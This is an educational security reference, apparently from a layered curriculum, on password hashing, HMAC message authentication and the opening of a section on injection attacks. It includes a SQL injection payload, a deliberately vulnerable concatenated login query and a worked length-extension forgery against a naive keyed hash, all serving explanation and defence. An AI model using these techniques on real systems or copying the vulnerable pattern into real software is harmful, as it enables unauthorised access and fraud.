history: Early Unix stored passwords in plain text in `/etc/passwd`, which everyone could read. Robert Morris and Ken Thompson described the fix in "Password Security: A Case History" (1979): the `crypt` function ran DES 25 times on a block of zeros using the password as the key, with a 12-bit salt. Even then, they found a lot of passwords guessable from a dictionary, and they added the salt and the slowness (25 iterations, at that time about a millisecond) exactly to make guessing more expensive. Salt and slowness are still the two core ideas.
Hardware then outran the designs. By the 2000s, MD5 and SHA-1 based schemes, even with salts, could be tried at hundreds of millions per second on GPUs. Niels Provos and David Mazières wrote bcrypt for OpenBSD in 1999 ("A Future-Adaptable Password Scheme"), built on the deliberately slow key setup of the Blowfish cipher, with a cost parameter that doubles the work with each step so the scheme can be made slower as computers get faster. PBKDF2 (RFC 2898, 2000) took a simpler route: iterate HMAC many times. The 2009 RockYou breach (about 32 million passwords stored in plain text) and the 2012 LinkedIn breach (unsalted SHA-1 hashes, most of which were cracked) showed that real sites still failed.
In 2009, Colin Percival introduced scrypt, which also needs a large amount of memory, based on the observation that custom chips are cheap in computation but costly in memory. A public Password Hashing Competition ran from 2013 to 2015, and in July 2015 Argon2 (Alex Biryukov, Daniel Dinu and Dmitry Khovratovich) was selected as the winner. It was later published as RFC 9106 (2021). Today the OWASP guidance lists Argon2id first, then scrypt, then bcrypt for older systems, and PBKDF2 where a FIPS-approved algorithm is required.
how: The simplest correct flow has two phases. When the user sets a password, the server generates a random salt (at least 16 bytes from a cryptographic random generator), computes `H = KDF(password, salt, cost)` and stores the algorithm, cost, salt and `H` in one string. At login, it reads that string, recomputes the function with the typed password and the stored salt and cost, and compares the result with the stored hash using a constant-time comparison. The salt need not be secret. Its job is to make every hash independent: an attacker cannot use a table built for "password123" against all users, and must attack each account separately.
How long must the salt be? Random salts of n bits collide between two users with probability about 2^−n per pair, and by the birthday bound among k users the chance of any shared salt is about k²/2^(n+1). With 128-bit salts and a billion users the chance is around 10^18 / 10^38 = 10^−20, which is negligible. The old 12-bit crypt salt had only 4,096 values, so with a few thousand users many salts repeated, and the table of 4,096 variants was feasible to precompute.
The slowness comes from the KDF design. PBKDF2 applies HMAC (keyed hashing from the hash function layer) repeatedly: \( U_1 = \text{HMAC}(P, S \,\|\, i) \), \( U_j = \text{HMAC}(P, U_{j-1}) \), and the result is the XOR of all \( U_j \). With c iterations it costs c times one HMAC. That is easy to implement and FIPS-approved, but it uses almost no memory, so a GPU runs thousands of copies in parallel at nearly the same cost per guess as the CPU.
bcrypt makes each guess slower and also uses a small fixed memory. It runs the Blowfish key schedule ("eksblowfish"): the 4 KB S-boxes are repeatedly updated, in a loop that runs 2^cost times, mixing the salt and password in each round. The state is small (about 4 KB), but it is read and written in a data-dependent order, which is awkward for GPUs: a GPU core has little fast memory, so far fewer parallel copies fit than raw arithmetic would allow. Cost 12 means 4,096 iterations and takes about 200 to 300 ms on a server CPU. The output is a 60-character string such as `$2b$12$` followed by 22 characters of salt and 31 of hash. bcrypt only uses the first 72 bytes of the password, which matters for long passphrases.
scrypt and Argon2 are memory-hard. The idea: fill a large array of pseudo-random blocks (for example 64 MiB) in a chain where each block depends on the previous one, then read it back in a pattern that depends on the data itself. A computer that does not hold the whole array must recompute the missing blocks repeatedly, and the time-memory trade-off is steep, so using less memory costs much more time. Because the cost of a custom chip is roughly area times time, and memory takes area, the attacker's advantage over the defender shrinks. Argon2 has three variants: Argon2d (data-dependent addressing, strongest against GPU but leaks through timing side channels), Argon2i (data-independent, safe against side channels, weaker against trade-offs) and Argon2id (a mix, the recommended default). Parameters are memory `m`, passes `t` and parallelism `p`. RFC 9106 gives two profiles: m = 2 GiB, t = 1, p = 4 when memory allows, and m = 64 MiB, t = 3, p = 4 for constrained cases. OWASP's minimum for Argon2id is m = 19 MiB, t = 2, p = 1.
The guess space shows why this works. A random 8-character password over lowercase letters and digits has 36^8 ≈ 2.8 × 10^12 possibilities. Humans do not choose uniformly. They choose from a few million likely passwords with predictable changes, so a good attacker tries those first. The hash function sets the price per guess, and the password's entropy sets how many guesses are needed. The defender controls only the price; the user controls the entropy; so systems add checks that reject common and breached passwords.
Finally, practical details. Store the parameters with the hash so you can raise them later; on a successful login, if the stored cost is below the current policy, recompute with the new parameters and replace the stored string ("rehash on login"). A pepper, applied as an HMAC of the password with a secret key before the KDF (or as an HMAC of the hash after it), protects against database-only leaks. Compare with constant-time functions, throttle login attempts, and never log or echo passwords.

example: Compare what a stolen database costs under different storage choices. Suppose an attacker has the table and one GPU that can do 22 × 10^9 SHA-256 hashes per second (a high-end card; this is roughly what published hashcat benchmarks show). Take a user whose password is 8 random characters from lowercase letters and digits: 36^8 ≈ 2.8 × 10^12 candidates.
Plain unsalted SHA-256: 2.8 × 10^12 / 22 × 10^9 ≈ 128 seconds to try all of them. Salt alone does not help against one user: the attacker still needs only 2 minutes for that account, but now must repeat it per user. bcrypt with cost 12: published hashcat benchmarks give a high-end GPU roughly 180,000 guesses per second at cost 5. Each step of cost halves the speed, so cost 12 is 2^7 = 128 times slower, about 1,500 per second. The same search takes 2.8 × 10^12 / 1,500 ≈ 1.9 × 10^9 seconds, about 59 years on one card. Even 10,000 such cards would need about 5 days for this one account, at a very high rental cost. The honest server pays about 250 ms once per login.
Now an ordinary user password. Most users choose from the top few million passwords. Under SHA-256 the attacker checks 10^9 candidates in 0.05 seconds. Under bcrypt cost 12, 10^9 candidates take 10^9 / 1,500 ≈ 6.7 × 10^5 seconds, about 8 days per account on one GPU; checking only the top 10^6 candidates takes 11 minutes. Slow hashing protects strong passwords and helps against weak ones only partly. This is why password policies also reject common and breached passwords.
Here is a correct implementation with Argon2id in Python, using the `argon2-cffi` library:
```python
from argon2 import PasswordHasher
from argon2.exceptions import VerifyMismatchError

ph = PasswordHasher(time_cost=2, memory_cost=19456,   # 19 MiB
                    parallelism=1)

def register(password: str) -> str:
    return ph.hash(password)     # random salt + params inside string

def login(stored: str, password: str) -> bool:
    try:
        ph.verify(stored, password)      # constant-time compare
    except VerifyMismatchError:
        return False
    if ph.check_needs_rehash(stored):    # parameters were raised
        save(ph.hash(password))          # upgrade silently
    return True
```
The stored string looks like `$argon2id$v=19$m=19456,t=2,p=1$<salt>$<hash>`, which carries everything needed to verify later. A load note: at 19 MiB per hash and 100 logins in flight at once, the login service needs about 2 GB of memory at peak, so capacity and rate limits must be planned.
intuition: A password hash is a lock that is deliberately slow to open: one honest turn of the key takes a moment, but an intruder who must try a billion keys spends a lifetime.
The design is natural because the defender and the attacker run the same function, and only their numbers differ. The defender computes it once per login, the attacker billions of times. Any fixed extra cost therefore hits the attacker a billion times harder. Salt makes sure the attacker cannot share the work between victims. Memory hardness finally makes the cost of cheap parallel hardware equal to the cost of ordinary hardware, so the attacker's best tool is no better than a server. The defender cannot make guessing impossible, because a user's password is a guess space the user picked; the goal is to make each guess expensive enough that only strong passwords survive.
mistakes: People often think hashing passwords with SHA-256 and a salt is secure. In fact SHA-256 is designed to be fast, and a GPU computes tens of billions per second, so a salted SHA-256 table is cracked quickly for any password a human would pick. Salt stops table reuse, not fast guessing. Use a purpose-built password hash.
People often think encryption is a good way to store passwords. In fact encrypted passwords can be decrypted by anyone who gets the key, and the server has no reason to ever see the password again after verification. A one-way hash gives the right property: even the operator cannot recover it. (Adobe's 2013 breach, which used reversible encryption, is the standard counter-example.)
People often think the salt must be kept secret or that a secret salt is better. In fact the salt is public by design and stored beside the hash. Its protection comes from being unique and random per password. A secret value used for all users is a pepper, a useful extra layer but a separate idea that must be stored outside the database.
People often think a higher cost is always better. In fact the cost is bounded by your own servers. A login that takes 2 seconds and 1 GB of memory lets an attacker overload the service with a few hundred login requests, which is a denial-of-service. Pick the highest setting that keeps login near 100 to 500 ms, and plan for peak concurrency.
People often think a password hash makes weak passwords safe. In fact if the password is "Summer2024!" it is among the first guesses of any attacker, and even a slow hash falls in minutes to hours. Hashing limits the damage after a leak; strong, unique passwords, breached-password checks and multi-factor authentication do the rest.
friction: There is no setting that satisfies everybody. Parameters that are safe against an offline attacker (hundreds of milliseconds, tens of megabytes) are costly at scale: a service with 5,000 logins per second at 250 ms each needs about 1,250 CPU cores busy on hashing alone. Memory-hard functions compound the problem with memory per concurrent login. Many companies therefore choose lower settings than they would like, or add rate limits and a queue.
Defaults age. Hardware improves, and parameters that were fine five years ago are weak today: OWASP's PBKDF2-HMAC-SHA256 recommendation, for instance, rose from 310,000 iterations in 2021 to 600,000 in 2023. Systems need an upgrade path: parameters stored with each hash, rehash on login, and a plan for accounts that never log in (wrap the old hash in a new one, or force a reset). Migrating from a weak legacy hash can be done without a reset by hashing the old hash with the new function and recording the scheme.
Algorithms have quirks. bcrypt truncates at 72 bytes and treats a NUL byte as the end of the string in some implementations, so pre-hashing long passwords needs care (and base64 encoding of the pre-hash). Argon2d-style data-dependent access can leak through cache timing on shared hardware. Memory-hard functions are not proven optimal; research on time-memory trade-offs continues, and specialised hardware can still reduce the cost somewhat.
Finally, passwords are the weak link by nature. Users reuse them, phishing steals them without any hash being involved, and credential stuffing (using passwords leaked elsewhere) bypasses all the cost. Hashing only addresses the stolen-database case. The structural answer is to remove the shared secret with passkeys (public-key sign-in) and to add a second factor.
practice: Use Argon2id with a library that implements the PHC string format (`argon2-cffi`, `libsodium`'s `crypto_pwhash`, Bouncy Castle, Go's `golang.org/x/crypto/argon2`). Start with the OWASP minimum (m = 19 MiB, t = 2, p = 1) or RFC 9106's second profile (m = 64 MiB, t = 3, p = 4), then measure on your hardware and raise the cost until a hash takes about 100 to 500 ms under production load. If you must use bcrypt, use cost 12 or higher (10 is now considered a minimum) and handle the 72-byte limit. Use PBKDF2-HMAC-SHA256 with at least 600,000 iterations only when FIPS compliance demands it.
Never write the algorithm yourself, never use a general-purpose hash (MD5, SHA-1, SHA-256) for passwords, and generate salts from the operating system's secure random source. Let the library produce the salt and encoded string; store that whole string in one column (a `VARCHAR(255)` or similar). Compare with the library's verify function, which is constant-time.
Operate it. Rate-limit and monitor login attempts per account and per IP; hash on a separate pool or with a concurrency limit (a semaphore) so a login flood cannot exhaust memory; run the hash on a worker thread in async servers, because it blocks for hundreds of milliseconds. Add a pepper from a secret manager or HSM when your threat model includes a database-only leak. Plan for rehash on login whenever you raise parameters.
Around the hash: enforce a minimum length (8 at least, 12 or more preferred) and allow long passphrases and all characters; check candidates against breached-password lists (for example the Have I Been Pwned range API, which uses k-anonymity and never sends the full hash); do not force periodic rotation without evidence of a breach (NIST SP 800-63B advises against it); require multi-factor authentication or passkeys for important accounts.
tradeoffs: Argon2id versus bcrypt. Choose Argon2id for new systems: it is memory-hard, tunable on three axes and the current standard. Choose bcrypt when the platform or library support is limited or the system is old and works; it needs little memory (good for small devices), but it is weaker against modern GPUs and ASICs than a memory-hard design with equal runtime, and its 72-byte limit is a nuisance.
Argon2id versus PBKDF2. Choose PBKDF2-HMAC-SHA256 when you need FIPS 140 validation or a library available everywhere; use at least 600,000 iterations. You give up memory-hardness, so a GPU attacker pays far less per guess than with Argon2id at the same server cost.
High cost versus login capacity. Choose a higher cost when the stored accounts are valuable and logins are rare (admin consoles, vaults). Choose a moderate cost (about 100 ms) for consumer logins at high volume. Each doubling of the cost gives the attacker one more bit of work, but also doubles your CPU bill and the risk of resource exhaustion at peak.
Pepper versus none. Choose a pepper in an HSM or secret manager when a database leak is the main threat and you can operate the secret safely; a stolen database is then not enough to crack anything. Skip it when you cannot protect or rotate the key reliably: losing the pepper locks out all users, and a pepper stored next to the database adds nothing.
Passwords versus passkeys. Keep passwords with strong hashing where you need compatibility with all users and devices. Choose passkeys (WebAuthn) for new products: no shared secret on the server, nothing to crack or phish. You trade away device-independent simplicity and must design account recovery.

value: When one server sends a message to another over an untrusted path (a webhook, a cookie handed to a browser, a request to a cloud API), the receiver needs two answers. Did this really come from someone who knows our shared secret? And was it changed on the way? A plain hash cannot answer, because anyone can hash anything. Encryption alone does not answer either: it hides content, but an attacker can often change the ciphertext in ways that produce a valid-looking message. What is needed is a message authentication code (MAC): a short tag computed from the message and a secret key, which only holders of the key can produce or verify.
HMAC is the standard way to build a MAC from an ordinary hash function such as SHA-256. The sender computes `tag = HMAC(key, message)` and sends both. The receiver recomputes the tag with the same key and compares. If one bit of the message changed, or the sender did not know the key, the tags differ and the message is rejected. A tag is 32 bytes for SHA-256, it costs about a microsecond to compute, and forging one without the key is believed to be as hard as breaking the hash function's pseudorandomness.
HMAC is everywhere on the production path of a data platform. AWS Signature Version 4 signs every API request to S3 and other services with a chain of HMACs, and presigned URLs are the same signature placed in a query string. GitHub and Stripe sign webhook bodies with it. Web frameworks sign session cookies. HS256 JSON Web Tokens are HMAC-SHA256. TOTP codes in authenticator apps are an HMAC of the current time. TLS authenticates records and derives keys with it. The layers below supply the pieces: cryptographic hash functions (L3) provide the one-way mixing, Boolean algebra (L4) gives the XOR and bit patterns used to pad the key, probability (L4) defines what "secure" means (a forger succeeds with negligible probability) and sets the tag length needed, and symmetric ciphers (L3) offer other MAC designs such as CMAC and the Poly1305 and GHASH used in authenticated encryption.
terms: MAC (message authentication code) — a short tag computed from a message and a secret key, proving that the sender knew the key and that the message is unchanged.
Tag — the output of the MAC; 32 bytes for HMAC-SHA256 (it may be truncated).
Shared secret key — a key known to both the signer and the verifier; whoever has it can both create and check tags.
ipad / opad — two fixed byte patterns (0x36 and 0x5c repeated) that are XORed with the key to make the inner and outer hash inputs differ.
Length-extension attack — an attack on hashes built the Merkle–Damgård way (MD5, SHA-1, SHA-2): from H(x) and the length of x, an attacker can compute H(x ‖ padding ‖ y) without knowing x.
PRF (pseudorandom function) — a keyed function whose outputs look random to anyone without the key; HMAC is designed to be one.
Existential unforgeability — the security goal for a MAC: even after seeing tags on many chosen messages, an attacker cannot produce a valid tag for any new message.
Replay — resending a valid, correctly signed message later; a MAC does not stop it unless the message contains a nonce or timestamp.
Constant-time comparison — comparing two tags in time that does not depend on how many leading bytes match.
history: The need appeared with the internet. In the early 1990s, protocol designers used ad hoc constructions such as `H(key ‖ message)` or `H(message ‖ key)`. Both had flaws: the first allows length extension on MD5, SHA-1 and SHA-2 hashes, and the second lets a collision in the hash be turned into a forgery. Gene Tsudik discussed these "secret prefix" and "secret suffix" methods in 1992, and in 1995 Preneel and van Oorschot attacked the "envelope" variants.
Mihir Bellare, Ran Canetti and Hugo Krawczyk published "Keying Hash Functions for Message Authentication" at CRYPTO 1996. They gave a nested construction with a proof: HMAC is secure as a MAC if the hash's compression function behaves like a pseudorandom function. RFC 2104 (1997) standardised it, and it was required for IPsec, and used in TLS, SSH and many other protocols. In 2006 Bellare gave a better proof that needs fewer assumptions ("New Proofs for NMAC and HMAC").
Its durability is its main record. MD5 collisions (2004) and SHA-1 collisions (a practical attack, 2017) ended those hashes for signatures, yet HMAC-MD5 and HMAC-SHA1 stayed unbroken as MACs, because HMAC does not rely on collision resistance, though new designs should use SHA-256 or better. The NIST standard FIPS 198-1 (2008) covers it. Alternatives exist for other settings: CMAC (from AES), Poly1305 (Daniel Bernstein, 2005; very fast, used with ChaCha20) and KMAC from SHA-3, which does not need the nested design because SHA-3 resists length extension. HMAC is also the base of HKDF (RFC 5869, 2010), the key derivation function used in TLS 1.3, and of the one-time-password standards HOTP (RFC 4226, 2005) and TOTP (RFC 6238, 2011).
how: The definition is short. Let H be a hash with block size B bytes (64 for SHA-256, 128 for SHA-512). Take the key K. If it is longer than B bytes, replace it by H(K); then pad it with zero bytes up to length B, and call the result K′. Then
\[ \text{HMAC}(K, m) = H\big( (K' \oplus \text{opad}) \,\|\, H\big( (K' \oplus \text{ipad}) \,\|\, m \big) \big) \]
where ipad is the byte 0x36 repeated B times, opad is the byte 0x5c repeated B times, ⊕ is bitwise XOR and ‖ is concatenation. In words: hash the message once with the key mixed in (the inner hash), then hash that result again with the key mixed in differently (the outer hash). The two XOR patterns are the Boolean algebra part of the design: they differ in many bits, so the inner and outer calls use two related but different keys derived from one.
Why nested twice, and not just `H(K ‖ m)`? Hashes like SHA-256 work in the Merkle–Damgård style: the message is split into blocks, and the internal state after each block is the input to the next. The final hash is the full internal state. So if an attacker knows `H(K ‖ m)` and the length of `K ‖ m`, they can load that state, keep hashing more data `y` (after the padding that the hash adds to `K ‖ m`), and produce a valid `H(K ‖ m ‖ pad ‖ y)` without knowing K. This is a forgery: a signed request with extra attacker-chosen content appended. HMAC's outer hash hides the inner state: the attacker sees only `H(K″ ‖ inner)`, a hash of an unknown inner value under a different key block, so there is no state to extend. SHA-3 (Keccak) uses a sponge with hidden capacity and so needs no such trick.
The security argument is a probability argument. The security proof says: if the compression function is a PRF, then HMAC is a PRF, which means no efficient attacker can distinguish HMAC output from random with a meaningful advantage. A PRF is also a MAC: if outputs look random, then guessing the tag of a new message succeeds with probability about 2^−t for a t-bit tag. For the full 256-bit tag this is 2^−256, effectively never. Even truncated to 128 bits, an attacker who submits guesses succeeds with probability 2^−128 per attempt. A very short tag, such as 32 bits, is secure only if the number of guesses is limited: at 1,000 online guesses per second, finding a 32-bit tag takes on average 2^31 / 1,000 seconds, about 25 days, unless the server rate-limits and alerts.
Verification must be done carefully. Recompute the tag over the exact bytes received and compare with a constant-time function (`hmac.compare_digest` in Python, `MessageDigest.isEqual` in Java, `crypto/subtle.ConstantTimeCompare` in Go). An ordinary `==` stops at the first differing byte, so response time leaks how many leading bytes were right, and an attacker can recover a valid tag one byte at a time by measuring timing (researchers have demonstrated this against real systems over networks). The signed bytes must also be unambiguous. If the signer builds a string by joining fields, `a=1&b=23` and `a=12&b=3` must not produce the same input; canonical formats and separators that cannot occur in the fields solve this.
Key derivation chains show a typical use. AWS Signature Version 4 never signs a request with the secret access key directly. It computes a chain: `kDate = HMAC("AWS4" + secret, "20261026")`, then `kRegion = HMAC(kDate, "ap-south-1")`, `kService = HMAC(kRegion, "s3")`, `kSigning = HMAC(kService, "aws4_request")`. The signature is `hex(HMAC(kSigning, stringToSign))`, where the string to sign includes the HTTP method, the path, the sorted query parameters, selected headers, the hash of the body and the timestamp. The chain limits a leaked derived key to one day, one region and one service. Presigned URLs put the signature and expiry in the query string, so anyone holding the URL can use it until it expires, but cannot change the object name, the method or the expiry, because they are covered by the tag.
A MAC is not a digital signature. Both sides hold the same key, so either can produce valid tags; a verifier cannot prove to a third party that the signer, and not the verifier, wrote a message. When non-repudiation or many verifiers without sharing a secret is needed, use public-key signatures (ECDSA, Ed25519). A MAC also does not hide the content, and does not stop replay on its own: the signed message should contain a timestamp or a unique identifier, and the receiver should reject old or repeated ones.

example: Verify a GitHub-style webhook, step by step. GitHub sends a POST with a JSON body and a header `X-Hub-Signature-256: sha256=<hex>`, where the value is HMAC-SHA256 of the raw body with the shared webhook secret. The receiver:
```python
import hmac, hashlib

SECRET = b"whsec_example_not_a_real_secret"

def verify(raw_body: bytes, header: str) -> bool:
    if not header.startswith("sha256="):
        return False
    expected = hmac.new(SECRET, raw_body, hashlib.sha256).hexdigest()
    return hmac.compare_digest(expected, header[len("sha256="):])
```
Three details matter. The HMAC must be taken over the raw bytes received, not over a parsed and re-serialised JSON, because key order or spacing may change and the tags would differ. The comparison is constant-time. And the secret is per endpoint, kept in a secret manager. Stripe's scheme adds replay protection: the header carries a timestamp `t` and the tag `v1 = HMAC(secret, t + "." + body)`; the receiver rejects the message if `t` is more than 5 minutes old, so a captured request cannot be sent again an hour later.
Now the attack that HMAC prevents, with a small case. A naive API signs requests as `sig = SHA-256(secret ‖ "user=alice&amount=10")` and sends the string and sig. An attacker who sees one signed request knows `sig`, which is the hash state after the padded message; they know the secret has, say, 16 bytes, so the total input length is known. They continue hashing from that state with `&amount=9999`, and send `"user=alice&amount=10" ‖ padding ‖ "&amount=9999"` with the new signature. The server recomputes SHA-256 over secret plus the received string and gets the same value. A server that reads the last `amount` parameter pays out 9999. Tools such as `hash_extender` automate this. With HMAC-SHA256 the same attacker has nothing to extend.
Last, the cost. HMAC-SHA256 of a small message needs four hash compressions at most (inner key block, message block, outer key block, outer hash block); implementations cache the two key blocks, leaving two. With SHA hardware instructions, one compression takes about 50 to 100 ns, so a tag costs a fraction of a microsecond to about a microsecond. A server can verify more than a million small requests per second per core, so the signature is never the bottleneck compared with the network or the body hash for large uploads.
intuition: A MAC is a wax seal pressed with a ring that only you and your friend own: anyone can look at the letter, but nobody without the ring can make a seal that matches changed contents.
HMAC is natural because it uses the one tool every system already has, a hash, and fixes its single weakness, that the hash is public and extendable. Mixing a secret into the input makes the output depend on the key; hashing twice, with two different key-derived blocks, closes the length-extension hole. The proof then reduces the question "can someone forge a tag?" to "does the compression function look random?", a property that has survived decades of attack even while collision resistance of MD5 and SHA-1 fell.
mistakes: People often think HMAC(key, message) is the same as hash(key + message). In fact the plain concatenation is vulnerable to length extension for MD5, SHA-1 and SHA-2, and the nesting with two different key pads is what removes that weakness. Never invent a keyed hash; use the library's HMAC.
People often think a MAC encrypts the message. In fact the message stays readable; the tag only proves who made it and that it is unchanged. If you need confidentiality too, use authenticated encryption (AES-GCM, ChaCha20-Poly1305), or encrypt and then MAC with separate keys.
People often think a valid HMAC proves the message is fresh. In fact the MAC covers the content only. A captured valid request can be sent again unless the signed content includes a timestamp or nonce and the receiver checks it (as Stripe, SigV4 with its timestamp window, and presigned-URL expiry do).
People often think any string comparison is fine for tags. In fact `==` returns at the first differing byte, which leaks timing. Use the constant-time function in your language, and compare the raw tags or equal-length hex strings.
People often think HMAC proves who sent a message to a third party. In fact both holders of the key can create valid tags, so it proves only that someone with the key sent it. It gives no non-repudiation. For that you need an asymmetric signature.
friction: Key management is the real difficulty. HMAC security is exactly the secrecy of the shared key: every verifier must hold the same secret that can also create signatures, so a leak at any of them breaks the whole scheme. Keys must be random and long (at least as many bits as the tag's security level, 32 bytes is a good default), rotated, stored in a secret manager, and not embedded in mobile apps or front-end code. HS256 JWTs make this concrete: any service that can verify a token can also mint one, so you should not hand the secret to many services; use RS256 or EdDSA, where verifiers hold only a public key.
Implementation mistakes dominate real failures. Signing parsed instead of raw data, ambiguous concatenation, non-constant-time comparison, accepting a tag of zero length or a truncated tag shorter than expected, missing replay protection, and algorithm confusion in JWTs (a verifier that lets the token choose its algorithm can be tricked into using a public key as an HMAC secret, or accepting "none") have all caused real vulnerabilities.
Another limit is scope. HMAC authenticates a whole message at once, so it is awkward for large streams, where the receiver must buffer everything before trusting any byte, or must authenticate chunks and also protect their order (chunk numbers, final-chunk marker). Per-chunk MACs are used for this, as in S3's streaming signature. Finally, a short key or a weak password used as an HMAC key can be guessed offline from a captured message and tag; use random keys, or a password hash if the key comes from a password.
practice: Use the HMAC from your standard library or a vetted crypto library with SHA-256 or stronger, and a random key of at least 32 bytes from a secure random generator. Keep the key in a secret manager, give one key per integration or purpose, and never reuse the same key for different protocols. Support rotation: include a key id in the message or header, and accept the old and new keys for a transition period.
When you sign a request or webhook, build a canonical string that cannot be ambiguous (fixed field order, length prefixes or unambiguous separators), include the method, path, a timestamp and, where it applies, a unique id; verify the timestamp within a short window (5 minutes is common) and cache seen ids if replay matters. Verify over the raw bytes, and compare with the constant-time function. Return the same error for all failures.
For tokens and cookies, use a well-tested library (itsdangerous, Rails MessageVerifier, a JWT library with a fixed allowed algorithm list). Prefer asymmetric signatures when many parties verify. Put short lifetimes on presigned URLs (minutes, not days), restrict them to one object and method, and remember that anyone with the URL can use it.
For debugging a SigV4 `SignatureDoesNotMatch`, compare the canonical request and string-to-sign with the server's error message: the usual causes are a changed header, a different path encoding, a body hash that does not match, a clock skew of more than a few minutes, or a proxy that rewrites headers. Test signing code against the official test vectors.
tradeoffs: HMAC versus a digital signature (Ed25519, ECDSA). Choose HMAC when two parties share a secret anyway and you want speed and tiny tags (32 bytes, about a microsecond). Choose a public-key signature when there are many verifiers, when the verifier must not be able to forge, or when you need non-repudiation. You pay with slower signing and verification (tens of microseconds) and larger signatures (64 bytes) but avoid sharing signing power.
HMAC versus authenticated encryption. Choose AES-GCM or ChaCha20-Poly1305 when you need both secrecy and integrity: one primitive, one pass, and a standard interface. Choose HMAC alone when the data is not secret (webhooks, cookies with non-sensitive state, request signing) or when you must sign data that stays in the clear. Rolling your own encrypt-then-MAC is possible but easy to get wrong.
HMAC-SHA256 versus other MACs. Choose HMAC-SHA256 as the default: simple, available everywhere, no nonce needed. Choose Poly1305 or GMAC inside an AEAD when you need the highest speed on large data and can manage unique nonces (a repeated nonce is catastrophic). Choose KMAC or HMAC-SHA3 in SHA-3 based systems, and CMAC where only an AES hardware block is available.
Full-length versus truncated tags. Use the full tag by default. Truncate (to 128 bits, for example) only when space is very tight, as in embedded protocols; 128 bits is still safe. Avoid tags under 64 bits unless the number of online guesses is strictly limited.
Short-lived derived keys versus one long-lived key. Choose a derivation chain (as in SigV4) or per-session keys when a key might leak from many places; a leaked derived key has a narrow scope. A single key is simpler to operate for one internal service pair, but its leak affects everything it protects.
interview: Why is HMAC(K, m) = H(K ‖ m) not used, and what does the nested construction fix? || H(K ‖ m) with Merkle–Damgård hashes (MD5, SHA-1, SHA-2) allows length extension: knowing the tag and the length, an attacker continues hashing to forge a tag for m ‖ padding ‖ y. HMAC's outer hash with a different key block hides the inner state, so no state is exposed to extend, and it comes with a security proof based on the compression function being a PRF.
Explain how AWS SigV4 signs a request and why it derives a signing key through several HMACs. || It builds a canonical request (method, path, sorted query, signed headers, body hash), a string to sign with the timestamp and scope, and signs it with a key derived by chained HMACs over date, region, service and "aws4_request". The derivation scopes a leaked signing key to one day, region and service, and lets the verifier recompute without exposing the long-term secret broadly.
A webhook consumer verifies signatures, but an attacker replays a captured valid request. How do you stop it? || The MAC does not cover freshness. Include a timestamp in the signed content and reject messages older than a few minutes, and store an event id for deduplication (idempotency). Stripe signs a timestamp; keep event ids for deduplication. Also use TLS so the request is not captured easily.
Why do you need constant-time comparison for tags, and how does a timing attack work? || A normal comparison returns at the first mismatching byte, so the response time grows with the number of correct leading bytes. An attacker tries all 256 values for byte 1, picks the slowest, then moves to byte 2, recovering a valid tag for a chosen message without the key. Constant-time comparison removes the signal.
When would you pick RS256 or EdDSA over HS256 for JWTs? || When tokens are verified by many services or by clients you do not control. With HS256 every verifier holds the secret that can mint tokens, so any one compromised service can forge them. With asymmetric signing verifiers hold only a public key, and the issuer alone can sign.
How does a MAC differ from a hash, a signature, and an AEAD? || A hash has no key, so anyone can compute it and it proves nothing about origin. A MAC adds a shared secret: integrity and authenticity between key holders. A signature uses a private/public key pair, so only the signer can produce it and anyone can verify. An AEAD combines encryption with a MAC in one operation for secrecy plus integrity.

@@ injection
value: Most servers build text that another program will interpret: a SQL query for the database, a command line for the shell, a URL for an HTTP client, an HTML page for the browser. The programmer writes the fixed parts and inserts the user's data into the gaps. Injection happens when the inserted data contains characters that the receiving interpreter treats as syntax, so the data changes the meaning of the whole text. The user who typed `' OR '1'='1` is no longer supplying a name; they are supplying part of the query. Data has become code.
This is among the oldest and most damaging bug classes on the web. SQL injection was described publicly in 1998 and still appears in breach reports a quarter of a century later; "Injection" has been in the OWASP Top 10 since the first list. The result depends on the interpreter: SQL injection reads or changes the whole database, command injection runs arbitrary programs on the server, and server-side request forgery (SSRF) makes your server send requests on the attacker's behalf from inside your network, where it can reach internal services and cloud credentials. The 2019 Capital One breach, which exposed data of over 100 million people, started with SSRF against the cloud metadata service.
The fix is the same principle in every case: keep code and data apart. A parameterized query sends the SQL text and the values separately, so values can never become syntax. The layers below explain why this works. Parsing and grammars (L3) show how a string is turned into a parse tree, and formal languages (L4) give the exact statement of the bug: input must stay at the leaves of the tree. SQL (L3) is the most common target and offers the mechanism that fixes it, the prepared statement. Above, cross-site scripting is injection into HTML, prompt injection is the same bug across the boundary of a language model, the API gateway's WAF tries to catch the patterns, and security architecture requires input handling at every trust boundary.
terms: Injection — an attack in which untrusted input is interpreted as part of a command, query or request instead of being treated as plain data.
SQL injection (SQLi) — injection into a SQL statement built by string concatenation.
Command injection — injection into a shell command line or an operating-system call, giving the attacker program execution.
SSRF (server-side request forgery) — tricking a server into making an HTTP request to a destination the attacker chooses, often an internal address.
Parameterized query (prepared statement) — a query whose text is sent with placeholders (`$1`, `?`) and whose values are bound separately, after the text has been parsed.
Escaping — rewriting special characters in input (for example `'` to `\'`) so that the interpreter reads them as data; useful but fragile.
Allow-list — a list of exactly what is permitted (a set of column names, hostnames, or a pattern); safer than a deny-list of bad things.
Trust boundary — a point where data passes from a less trusted party to a more trusted one; input must be validated or kept as data there.
Egress filtering — restricting which destinations a server may connect to, so a forged request cannot reach internal or metadata addresses.
history: The idea that mixing code and data is dangerous is older than the web. Early phone-system "blue boxes" in the 1960s and 1970s sent control tones inside the voice channel, so callers could issue commands to the network; the lesson was that in-band signalling lets users forge control messages. SQL injection followed when web applications began to build queries from form fields. It was written up publicly by Jeff Forristal (using the name "rain.forest.puppy") in Phrack magazine in December 1998, in an article about Windows NT web technology weaknesses. A well-known joke from 2007, the xkcd comic about "Little Bobby Tables", made the idea part of programmer culture.
Large breaches kept repeating it: Heartland Payment Systems (2008, over 100 million cards, SQL injection was part of the attack chain), Sony Pictures (2011), and many others. The OWASP Top 10 ranked injection first in 2010, 2013 and 2017, and in 2021 it moved to third place (A03) as frameworks improved, with SSRF added as a separate entry (A10), after the Capital One case. Command injection had its own spectacular cases: the Shellshock bug in bash (2014), where a crafted environment variable ran commands, and Log4Shell (December 2021, CVE-2021-44228), where a logged string was interpreted as a JNDI lookup that loaded remote code.
The theory caught up in 2006, when Zhendong Su and Gary Wassermann gave a precise definition in "The Essence of Command Injection Attacks in Web Applications" (POPL 2006): an attack happens when untrusted input changes the syntactic structure of the command, meaning its parse tree. This definition explains why escaping is delicate and why parameterization is robust. Defensive practice moved from "sanitise the input" to "use APIs that never build code from data", and in the 2020s the same pattern reappeared as prompt injection in systems built on language models.
how: Take a login check written with string concatenation:
```python
q = ("SELECT id FROM users WHERE name = '" + name
     + "' AND pw = '" + pw + "'")
```
